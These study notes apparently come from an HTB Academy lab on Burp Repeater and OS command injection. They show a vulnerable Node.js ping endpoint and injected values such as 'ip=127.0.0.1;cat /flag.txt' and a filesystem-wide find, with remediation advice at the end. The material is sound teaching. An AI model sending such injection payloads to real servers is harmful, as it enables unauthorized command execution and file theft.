# Burp Repeater & OS Command Injection — Study Notes

Reference notes for the **HTB Academy – Web Proxies** topic, covering how to resend and modify
HTTP requests with **Burp Repeater**, and how an **OS command injection** flaw is identified and
understood on an authorized lab target.

> [!NOTE]
> These notes describe work on an authorized HTB lab. Only test applications you own or are
> explicitly permitted to test.

---

## Contents

| Part | Topics |
| ---- | ------ |
| **1. Tools** | [What is a web proxy?](#1-what-is-a-web-proxy) · [What is Burp Repeater?](#2-what-is-burp-repeater) |
| **2. Workflow** | [Capture the request](#3-capture-the-request) · [Send it to Repeater](#4-send-the-request-to-repeater) · [Repeater vs Intercept](#5-repeater-vs-intercept) |
| **3. The vulnerability** | [What is command injection?](#6-what-is-os-command-injection) · [Why this app was vulnerable](#7-why-the-app-was-vulnerable) · [Confirming it](#8-confirming-the-injection) |
| **4. Enumeration** | [Exploring the filesystem](#9-exploring-the-filesystem) · [Locating the target file](#10-locating-the-target-file) |
| **5. Revision** | [Command reference](#11-command-reference) · [Mental model](#12-mental-model) · [Quick revision](#13-quick-revision) · [Remediation](#14-remediation) |

---

# Part 1 — Tools

## 1. What is a Web Proxy?

A **web proxy** sits between your browser and the web server, so every request and response
passes through it. That lets you **pause, read, and modify** traffic before it continues.

```text
Browser  ⇄  Web Proxy (Burp)  ⇄  Server
```

**Burp Suite** is the most common web proxy for web security testing. Its core features:

| Feature | Purpose |
| ------- | ------- |
| **Proxy** | Capture traffic between the browser and the server |
| **HTTP history** | A log of every request that passed through the proxy |
| **Repeater** | Resend and edit a single request repeatedly |
| **Intruder** | Automate sending many variations of a request |

> [!TIP]
> To route browser traffic through Burp, use Burp's built-in browser, or set your browser's proxy
> to `127.0.0.1:8080` and install Burp's CA certificate so HTTPS can be inspected.

---

## 2. What is Burp Repeater?

**Repeater** lets you take one request and **send it again and again**, changing it each time and
reading the response. It is the main tool for manually probing how a single endpoint behaves.

Why it matters: without Repeater, testing one small change means intercepting a fresh request
every time. Repeater removes that friction, so you can iterate quickly on the same request.

---

# Part 2 — Workflow

## 3. Capture the Request

Use the application normally (here, a form that pings an IP address) so the request appears in Burp:

```text
Proxy → HTTP history
```

Locate the request the action produced:

```http
POST /ping HTTP/1.1
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1
```

The `ip` parameter is user input, which makes it the first thing worth testing.

---

## 4. Send the Request to Repeater

Select the request in **HTTP history** and send it to Repeater:

```text
Ctrl + R        (or right-click → "Send to Repeater")
```

Then open the **Repeater** tab, edit the request on the left, click **Send**, and read the
response on the right.

---

## 5. Repeater vs Intercept

Both let you modify a request, but the workflow is very different.

```text
Intercept (slow, one-shot)          Repeater (fast, iterative)

Browser                             HTTP history
   ↓                                      ↓
Intercept                            Send to Repeater
   ↓                                      ↓
Modify                               Modify request
   ↓                                      ↓
Forward                                 Send
   ↓                                      ↓
Check browser                       Read response  ──┐
                                          ↑           │
                                          └───────────┘  (repeat)
```

| | Intercept | Repeater |
| --- | --- | --- |
| Edits before sending | Yes | Yes |
| Resend with a new change | Re-capture each time | Edit and click Send |
| Good for | A single on-the-fly change | Iterating on one request |

> [!IMPORTANT]
> Change **one thing at a time** in Repeater, so each response clearly maps to the change you made.

---

# Part 3 — The Vulnerability

## 6. What is OS Command Injection?

**OS command injection** happens when an application builds a **system command** out of user input
and runs it, without separating the input from the command. An attacker can then add their own
commands, which the server executes with the application's privileges.

Shell **command separators** make this possible — they chain extra commands onto the intended one:

| Separator | Effect |
| --------- | ------ |
| `;` | Run the next command after the first |
| `&&` | Run the next command only if the first succeeds |
| `\|\|` | Run the next command only if the first fails |
| `\|` | Pipe the first command's output into the next |
| `` `...` `` / `$(...)` | Run a command and substitute its output |

---

## 7. Why the App Was Vulnerable

Reading the server source (`cat server.js`) showed user input concatenated straight into a shell
command:

```javascript
child_process.exec(
  'ping -c 1 127.0.0.' + ip,
  function (error, stdout) {
    // ...
  }
);
```

The value of `ip` is joined directly onto the `ping` command string. Because `exec` runs that
string through a shell, any separator in `ip` is interpreted by the shell rather than treated as
plain data. That is the root cause.

---

## 8. Confirming the Injection

A harmless command appended after a separator confirms the flaw. `pwd` (print working directory)
returns a clear, side-effect-free result:

```text
ip=127.0.0.1;pwd
```

Response:

```text
/var/www/html
```

The server ran `pwd` and returned its output, which proves the injected command executed and
reveals the application's working directory.

---

# Part 4 — Enumeration

## 9. Exploring the Filesystem

With injection confirmed, read-only commands map out the target. List the current directory in
detail:

```text
ip=127.0.0.1;ls -la
```

```text
flag.txt
index.html
node_modules
package-lock.json
public
server.js
```

`ls` lists files; `ls -la` lists **all** files (including hidden ones) with details such as
permissions and size. Subdirectories can be listed the same way:

```text
ip=127.0.0.1;ls -la public
```

Reading application source, as above, explains *why* the endpoint behaves as it does:

```text
ip=127.0.0.1;cat server.js
```

---

## 10. Locating the Target File

When the file isn't in the current directory, search the whole filesystem instead of guessing:

```text
ip=127.0.0.1;find / -type f -iname "*flag*" 2>/dev/null
```

**Breakdown:**

| Part | Meaning |
| ---- | ------- |
| `find /` | Start the search at the filesystem root |
| `-type f` | Match files only (not directories) |
| `-iname "*flag*"` | Match names containing `flag`, case-insensitive |
| `2>/dev/null` | Discard error output (e.g. "permission denied") for clean results |

Result:

```text
/var/www/html/flag.txt
/flag.txt
```

The search found a second file outside the web directory, at `/flag.txt`. Reading a known path is
a plain `cat`:

```text
ip=127.0.0.1;cat /flag.txt
```

> [!TIP]
> When one location gives the wrong answer, widen the search. A filesystem-wide `find` reveals
> files that a single-directory listing misses.

---

# Part 5 — Revision

## 11. Command Reference

Read-only Linux commands used to understand the target:

| Command | Purpose |
| ------- | ------- |
| `pwd` | Print the current working directory |
| `ls` | List files |
| `ls -la` | List all files (including hidden) with details |
| `cd` | Change directory |
| `cat file` | Print a file's contents |
| `find / ...` | Search the filesystem |
| `grep` | Filter or search within text |
| `whoami` | Show the current user |
| `2>/dev/null` | Discard error output |

---

## 12. Mental Model

When testing a parameter for command injection, work through these questions:

| # | Question | How to check |
| - | -------- | ------------ |
| 1 | Which parameter is user-controlled? | Read the request body / query string |
| 2 | Does the server use it in a command? | Behaviour, error messages, or source code |
| 3 | Does a separator change the response? | Append `;pwd` and compare |
| 4 | What context am I in? | `pwd`, `whoami` |
| 5 | Where is the interesting file? | `ls -la`, then `find`|
| 6 | How do I read it? | `cat <path>` |

---

## 13. Quick Revision

- A **web proxy** sits between browser and server so you can read and modify traffic.
- **Burp Repeater** resends and edits one request repeatedly — far faster than re-intercepting.
- Workflow: **HTTP history → Send to Repeater → modify → Send → read response → repeat.**
- **Command injection** = user input concatenated into a system command and executed by a shell.
- Shell **separators** (`;`, `&&`, `||`, `|`, `$()`) chain extra commands.
- Confirm safely with `pwd`; enumerate with `ls -la`, `cat`, and `find`.
- `find / -type f -iname "*name*" 2>/dev/null` locates files across the whole filesystem.
- Change **one thing at a time** and compare responses.

---

## 14. Remediation

Understanding *why* the flaw exists is what makes the lab useful. How this class of bug is fixed:

| Fix | Why it works |
| --- | ------------ |
| **Don't call the shell** | Use language APIs that take arguments as a list, so input is never parsed as a command |
| **Validate input strictly** | Accept only what's expected — e.g. a valid IP address via an allow-list / regex |
| **Avoid string concatenation** | Never build command strings from user input |
| **Least privilege** | Run the service with minimal permissions so impact is limited if it is abused |

> [!IMPORTANT]
> The takeaway isn't the specific commands — it's the method: **use Repeater to iterate on one
> request quickly, reason about how the server handles your input, and verify each change against
> the response.**

---

<p align="center"><i>Practice only on systems you're authorized to test (HTB labs, localhost).</i></p>
